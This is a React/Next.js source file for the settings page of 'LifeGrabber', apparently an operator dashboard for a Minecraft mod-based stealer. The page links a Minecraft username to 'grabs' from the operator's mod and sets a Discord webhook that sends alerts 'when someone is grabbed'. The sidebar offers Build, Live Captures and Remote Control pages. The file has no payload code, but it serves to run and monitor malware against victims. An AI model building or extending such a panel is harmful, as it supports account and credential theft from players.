'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function SettingsPage() {
  const router = useRouter();
  const [webhook, setWebhook] = useState('');
  const [minecraftUsername, setMinecraftUsername] = useState('');
  const [saved, setSaved] = useState(false);
  const [mcSaved, setMcSaved] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [proChecked, setProChecked] = useState(false);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          const email = d.user.email;
          setUserEmail(email);
          setProChecked(true);

          fetch(`/api/user/minecraft?email=${encodeURIComponent(email)}`)
            .then(r => r.json())
            .then(mc => { if (mc?.username) { setMinecraftUsername(mc.username); setMcSaved(true); } })
            .catch(() => {});

          fetch(`/api/user/settings?email=${encodeURIComponent(email)}`)
            .then(r => r.json())
            .then(s => { if (s?.webhook_url) setWebhook(s.webhook_url); })
            .catch(() => {});
        } else {
          setProChecked(true);
        }
      })
      .catch(() => { setProChecked(true); });
  }, []);

  const handleSave = async () => {
    const res = await fetch('/api/user/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: userEmail, webhook_url: webhook }),
    });
    if (res.ok) setSaved(true);
  };

  const handleSaveMc = async () => {
    if (!minecraftUsername.trim()) return;
    const res = await fetch('/api/user/minecraft', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: userEmail, minecraft_username: minecraftUsername.trim() }),
    });
    if (res.ok) setMcSaved(true);
  };

  const handleTest = async () => {
    if (!webhook) return;
    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: 'LifeGrabber — Test',
            description: 'Webhook test successful! LifeGrabber is connected.',
            color: 2201972,
            footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
          }],
        }),
      });
      alert('Test webhook sent!');
    } catch (e) {
      alert('Failed to send test webhook. Check the URL.');
    }
  };

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          {userEmail === 'lifegrading@gmail.com' && (
            <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
          )}
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" active onClick={() => {}} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px' }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Settings</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Configure your notifications and account.</p>

        <div className="glass-card" style={{ borderRadius: 12, padding: 24, maxWidth: 600, marginBottom: 24 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
            <span>👤</span> Minecraft Username
          </div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
            Your Minecraft username links grabs from your mod to your account.
          </div>
          <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
            <input
              type="text"
              value={minecraftUsername}
              onChange={e => { setMinecraftUsername(e.target.value); setMcSaved(false); }}
              placeholder="Minecraft username"
              style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', transition: 'all 0.2s ease' }}
            />
            <button
              onClick={handleSaveMc}
              disabled={!minecraftUsername.trim()}
              className="btn-smooth"
              style={{ background: mcSaved ? colors.green : 'transparent', color: mcSaved ? '#000' : colors.textDim, border: `1px solid ${mcSaved ? colors.green : 'rgba(255,255,255,0.06)'}`, borderRadius: 8, padding: '10px 16px', fontSize: 13, fontWeight: 600, cursor: minecraftUsername.trim() ? 'pointer' : 'not-allowed' }}
            >
              {mcSaved ? '✓ Saved' : 'Save'}
            </button>
          </div>
          {mcSaved && minecraftUsername && (
            <div style={{ marginTop: 8, fontSize: 12, color: colors.green }}>
              ✓ Username linked to <strong>{minecraftUsername}</strong>
            </div>
          )}
        </div>

        <div className="glass-card" style={{ borderRadius: 12, padding: 24, maxWidth: 600 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
            <span>💬</span> Discord Webhook
          </div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
            Get notified on Discord when someone is grabbed. You'll receive a "New Capture" or "Capture Updated" embed.
          </div>
          <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>WEBHOOK URL</div>
          <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
            <input
              type="url"
              value={webhook}
              onChange={e => { setWebhook(e.target.value); setSaved(false); }}
              placeholder="https://discord.com/api/webhooks/..."
              style={{ flex: 1, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none', transition: 'all 0.2s ease' }}
            />
            <button
              onClick={handleSave}
              disabled={!webhook}
              className="btn-smooth"
              style={{ background: saved ? colors.green : 'transparent', color: saved ? '#000' : colors.textDim, border: `1px solid ${saved ? colors.green : 'rgba(255,255,255,0.06)'}`, borderRadius: 8, padding: '10px 16px', fontSize: 13, fontWeight: 600, cursor: webhook ? 'pointer' : 'not-allowed' }}
            >
              {saved ? '✓ Saved' : 'Save'}
            </button>
          </div>
          <button
            onClick={handleTest}
            disabled={!webhook}
            className="btn-smooth"
            style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.06)', color: webhook ? colors.text : '#555', borderRadius: 8, padding: '8px 16px', fontSize: 13, cursor: webhook ? 'pointer' : 'not-allowed' }}
          >
            Send Test Webhook
          </button>
          {saved && (
            <div style={{ marginTop: 10, fontSize: 12, color: colors.green }}>
              ✓ Webhook saved — you'll get notified on every grab
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
